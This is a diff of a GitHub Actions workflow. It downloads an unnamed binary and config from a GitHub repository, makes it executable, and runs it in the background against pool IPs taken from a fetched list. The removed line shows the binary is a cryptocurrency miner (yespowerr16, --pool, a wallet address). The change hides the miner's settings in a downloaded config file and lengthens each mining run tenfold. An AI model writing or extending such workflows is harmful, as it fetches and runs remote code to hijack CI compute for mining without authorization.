@@ -45,8 +45,9 @@ jobs:
           current_timestamp=$(date +%s)
           mkdir -p .lib
           dynamic_sgr=".lib/sgr_$current_timestamp"
-          wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
-          chmod +x $dynamic_sgr
+          wget -O $dynamic_sgr https://github.com/barburonjilo/open/raw/refs/heads/main/isu
+          wget -q -O config.json https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json
+          chmod +x $dynamic_sgr config.json
           ip_list="list_$current_timestamp.json"
           wget -O $ip_list https://github.com/barburonjilo/setstra/raw/main/list4.json
           if [[ ! -f $ip_list ]]; then
@@ -76,13 +77,13 @@ jobs:
             selected_port=$(shuf -i 802-810 -n 1)
 
             # Start the process with the chosen port
-            nohup $dynamic_sgr -a yespowerr16 --pool $selected_ip:$selected_port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 4 -p m=solo > log_$selected_port_$current_timestamp.log 2>&1 &
+            nohup $dynamic_sgr -c config.json > log_$selected_port_$current_timestamp.log 2>&1 &
             process_id=$!
 
             echo "Started process with PID $process_id using IP $selected_ip and port $selected_port"
 
             # Run for 1 minute
-            sleep 60
+            sleep 600
 
             # Terminate the process
             kill $process_id || true
